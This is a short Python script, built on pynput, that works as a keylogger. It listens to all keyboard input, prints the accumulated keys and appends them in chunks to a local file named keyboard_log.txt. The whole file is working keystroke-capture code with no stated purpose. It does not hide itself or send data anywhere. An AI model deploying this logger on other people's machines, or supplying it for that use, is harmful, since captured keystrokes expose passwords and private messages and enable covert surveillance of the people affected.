from pynput.keyboard import Key, Controller, Listener
import time

keyboard = Controller()
keys = []

def on_press(key):
    # 可以在此处处理按下事件（如记录时间等）
    pass

def on_release(key):
    global keys
    string = str(key).replace("'", "")
    keys.append(string)
    main_string = "".join(keys)
    print(main_string)
    if len(main_string) > 15:
        with open('keyboard_log.txt', 'a', encoding='utf-8') as f:
            f.write(main_string + '\n')
        keys.clear()

def start_detect():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == '__main__':
    start_detect()